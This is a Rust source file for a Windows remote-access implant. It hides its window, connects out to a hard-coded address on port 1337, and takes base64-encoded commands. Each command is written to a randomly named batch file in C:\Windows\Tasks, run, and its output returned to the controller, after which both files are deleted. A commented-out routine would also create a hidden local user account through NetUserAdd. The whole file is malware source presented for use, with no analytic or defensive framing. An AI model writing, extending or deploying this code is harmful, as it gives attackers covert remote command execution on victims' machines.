#![windows_subsystem = "windows"]
use std::{
    ffi::OsStr,
    fs::File,
    io::{self, prelude::*},
    iter::once,
    net::TcpStream,
    os::windows::ffi::OsStrExt,
    process,
};
use rand::{distributions::Alphanumeric, thread_rng, Rng};

use tokio::io::{AsyncReadExt, AsyncWriteExt};


async fn connect_to() -> io::Result<()> {
    let ip_address = "192.168.1.86:1337";
    let mut stream = TcpStream::connect(ip_address)?;
    let _buffer = [0; 1024];
    let mut stream_clone = stream.try_clone().expect("Failed to clone stream");

    tokio::spawn(async move {
        let mut recv_buffer = [0; 1024];
        loop {
            match stream_clone.read(&mut recv_buffer) {
                Ok(n) if n > 0 => {
                    let decode_base64ed_buffer = decode_base64(recv_buffer[..n].to_vec());
                    println!("{}", String::from_utf8_lossy(&decode_base64ed_buffer).trim());
    
                    let code = String::from_utf8_lossy(&decode_base64ed_buffer)
                        .trim()
                        .to_string();
                    match create_write_exec_remove(&code) {
                        Ok(return_value) => {
                            let encoded_bytes = base64::encode(return_value); // Encode into base64
                            if let Err(err) = stream.write_all(&encoded_bytes.as_bytes()) {
                                eprintln!("Error writing to stream: {}", err);
                            }
                        }
                        Err(err) => {
                            eprintln!("Error from create_write_exec_remove: {}", err);
                        }
                    }
                    // if let Err(err) = send_test(&mut stream).await {
                    //     eprintln!("Error sending 'test' to server: {}", err);
                    // }
                }
                _ => break,
            }
        }
    })
    .await
    .unwrap();
    

    Ok(())
}

async fn send_test(stream: &mut TcpStream) -> io::Result<()> {
    stream.write_all(b"test\n");
    Ok(())
}
fn input_to_b64(input: String) -> String {
    let input = base64::encode(input);
    input
}

fn decode_base64(recv_buffer: Vec<u8>) -> Vec<u8> {
    let decoded_buffer = base64::decode(&recv_buffer).expect("Error during decoding");
    decoded_buffer
}



// fn create_user_1() {
//     let username = winstr("Test");
//     let password = winstr("Test******");
//     let mut user = USER_INFO_1 {
//         usri1_name: username.as_mut_ptr(),
//         usri1_password: password.as_mut_ptr(),
//         usri1_priv: 1,
//         usri1_password_age: 0,
//         usri1_home_dir: std::ptr::null_mut(),
//         usri1_comment: std::ptr::null_mut(),
//         usri1_flags: UF_SCRIPT,
//         usri1_script_path: std::ptr::null_mut(),
//     };

//     let mut error = 0;
//     unsafe {
//         NetUserAdd(
//             std::ptr::null_mut(),
//             1,
//             &mut user as *mut _ as _,
//             &mut error,
//         );
//     }
// }

// fn winstr(value: &str) -> Vec<u16> {
//     OsStr::new(value).encode_wide().chain(once(0)).collect()
// }

fn create_file(code: &str) -> io::Result<String> {
    let random_filename: String = thread_rng().sample_iter(&Alphanumeric).take(9).map(char::from).collect();
    let output_file_path = format!("C:\\windows\\TASKS\\{}.bat", random_filename);
    let mut file = File::create(&output_file_path)?;
    writeln!(file, "@echo off")?;
    writeln!(file, "{}", code)?;
    Ok(output_file_path)
}

fn execute_bat_and_redirect_output_to_file(file_path: &str) -> io::Result<String> {
    let random_filename: String = thread_rng().sample_iter(&Alphanumeric).take(8).map(char::from).collect();
    let out_file = format!("C:\\windows\\Tasks\\{}.txt", random_filename);
    let output = process::Command::new(file_path).output()?;
    let mut file = File::create(&out_file)?;
    file.write_all(&output.stdout)?;
    println!("stdout = {:?}", output.stdout);
    Ok(out_file)
}

fn read_file(file_path: &str) -> io::Result<String> {
    let mut file = File::open(file_path)?;
    let mut contents = String::new();
    file.read_to_string(&mut contents)?;
    Ok(contents)
}

fn remove_file(file_path: &str) -> io::Result<()> {
    std::fs::remove_file(file_path)?;
    Ok(())
}

fn create_write_exec_remove(code: &str) -> io::Result<String> {
    let file_path = create_file(code)?;
    let out_file = execute_bat_and_redirect_output_to_file(&file_path)?;
    let content = read_file(&out_file)?;
    remove_file(&file_path)?;
    remove_file(&out_file)?;
    println!("content = {}", content);
    Ok(content)
}

#[tokio::main]
async fn main() {
    if let Err(err) = connect_to().await {
        eprintln!("Error: {}", err);
    }
}
